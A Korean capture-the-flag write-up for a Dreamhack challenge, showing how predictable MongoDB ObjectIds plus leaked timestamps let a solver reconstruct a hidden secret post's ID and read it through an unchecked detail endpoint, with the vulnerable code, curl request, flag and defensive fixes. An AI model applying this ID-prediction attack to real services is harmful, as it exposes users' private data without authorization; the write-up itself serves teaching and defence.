````markdown
## objectid_prediction

> 문제 설명: MongoDB 기반 게시판 API(`/api/board`, `/api/board/:board_id`) 문제입니다. 목록 조회 시 `secret: true`인 글은 `_id`를 `null`로 숨기지만, `title`, `author`, `publish_date`는 그대로 노출되며, 상세 조회(`/api/board/:board_id`)는 secret 여부를 검증하지 않고 `_id`만 알면 누구나 조회할 수 있습니다.

### **취약점: MongoDB ObjectId 예측 (IDOR + 정보 노출)**

```javascript
// 목록 조회 - _id만 숨김, 나머지 정보는 노출
app.get("/api/board", function (req, res) {
  MongoBoard.find(function (err, board) {
    res.json(
      board.map((data) => {
        return {
          _id: data.secret ? null : data._id,
          title: data.title,
          author: data.author,
          secret: data.secret,
          publish_date: data.publish_date, // ← 생성 시각 그대로 노출
        };
      }),
    );
  });
});

// 상세 조회 - secret 여부 검증 없음
app.get("/api/board/:board_id", function (req, res) {
  MongoBoard.findOne({ _id: req.params.board_id }, function (err, board) {
    res.json(board); // ← _id만 알면 비밀글도 그대로 반환
  });
});
```
````

`_id`를 `null`로 숨기는 것만으로 접근을 막으려 했지만, **MongoDB ObjectId는 랜덤값이 아니라 구조화된 값**이라 주변 데이터(다른 글의 `_id`, `publish_date`)로부터 역산이 가능합니다.

#### **ObjectId 구조 (12바이트 = 24자리 hex)**

```
[4바이트: Timestamp] + [5바이트: 프로세스 고정 랜덤값] + [3바이트: 순차 증가 카운터]
```

- **random(5바이트)**: 같은 서버 프로세스에서 생성된 ObjectId는 모두 동일
- **counter(3바이트)**: 생성될 때마다 1씩 순차 증가 (컬렉션 전역)
- **timestamp(4바이트)**: 생성 시각(Unix Timestamp)을 그대로 반영, `publish_date`와 1:1 대응

### Solve 😈

**확보한 데이터 (목록 조회 응답)**

| \_id                       | Title | publish_date |
| -------------------------- | ----- | ------------ |
| `6aeffd5bec1db4603e8c39df` | Hello | 04:40:59     |
| `6aeffd5fec1db4603e8c39e0` | Mongo | 04:41:03     |
| `null` (secret)            | FLAG  | 04:41:08     |
| `6aeffd67ec1db4603e8c39e2` | Good  | 04:41:11     |

**① random 부분은 고정값**
→ 모든 글에서 `ec1db4603e`로 동일 → flag 글도 동일할 것으로 추정

**② counter는 순차 증가 (+1)**
→ 앞뒤 글(`8c39e0`, `8c39e2`) 사이에 flag 글 1개가 끼어 있으므로

```
8c39e0 + 1 = 8c39e1
```

**③ timestamp는 publish_date 기반으로 역산**
→ 초 단위 시간 차이와 hex 값 차이가 정확히 일치 (예: 4초 차이 → hex도 +4)

```
04:41:03(6aeffd5f) + 5초 = 04:41:08 → 6aeffd5f + 5 = 6aeffd64
```

**복원된 \_id**

```
6aeffd64ec1db4603e8c39e1
```

**요청**

```bash
curl http://host3.dreamhack.games:14760/api/board/6aeffd64ec1db4603e8c39e1
```

**결과**

```json
{
  "secret": true,
  "_id": "6aeffd64ec1db4603e8c39e1",
  "title": "FLAG",
  "body": "DH{f823bac286ef352172b1cd73c812708ea356a000}",
  "author": "admin",
  "publish_date": "2026-11-08T04:41:08.432Z"
}
```

### 근본 원인 및 방어법

- **원인**:
  - `_id`를 숨기는 "값 은닉(security through obscurity)"만으로 접근 제어를 대체 → MongoDB ObjectId는 시간/순서 기반으로 예측 가능한 구조
  - 목록 API에서 비밀글의 `publish_date` 등 부가 정보가 그대로 노출되어 ObjectId 역산의 단서 제공
  - 상세 조회 API(`/api/board/:board_id`)에서 `secret` 여부에 대한 인가 검증이 전혀 없음
- **방어법**
  - 상세 조회 시 **`secret: true`인 글은 별도 인증/권한 검증 없이는 반환하지 않도록** 서버 로직 수정
  - 민감한 자원 식별자로 **예측 가능한 값(ObjectId, 순차 증가 ID 등)을 그대로 사용하지 않고**, UUID v4처럼 예측 불가능한 랜덤 토큰 사용
  - 목록 API 응답에서 비밀글의 메타데이터(생성 시각 등)도 함께 숨기거나 마스킹

```

```
